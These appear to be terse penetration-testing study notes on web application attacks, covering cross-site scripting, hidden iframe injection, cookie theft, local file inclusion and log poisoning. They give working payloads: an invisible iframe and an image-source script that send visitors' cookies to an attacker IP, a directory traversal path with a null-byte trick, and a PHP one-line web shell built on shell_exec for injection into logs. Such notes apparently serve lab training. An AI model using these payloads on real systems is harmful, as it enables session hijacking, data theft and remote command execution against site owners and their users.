https://www.securityfocus.com/vulnerabilities

Web application attacks

Cross site scripting

Caused by unsanitized user input that is then displayed on a web page

Need a simple example to testing for XSS with an alert

Browser redirection and iFrame injection

Injecting an invisible iframe

```<iframe SRC=”http://10.11.0.5/report” height= “0” width= “0”></iframe>```

When the victim visits the page, their browser connects to the attacking machine (required netcat listener, port 80)

Stealing cookies and session information

```<script> new Image().src=”http://10.11.0.5/bogus.php?output=”+document.cookie; </script>```

The victim browsing the page makes a connection back to us with an authenticated session value (listener required)

Use a cookie editor like Cookies Manager to steal the session

File inclusion vulnerabilities 

LFI

Look for pages that include EXAMPLE in the URL

```../../../../../../windows/system32/drivers/etc/hosts```

In PHP versions below 5.3, terminate the request with a null byte "(%00)"

Contaminating log files

```<?php echo shell_exec($_GET[‘cmd’]);?>```
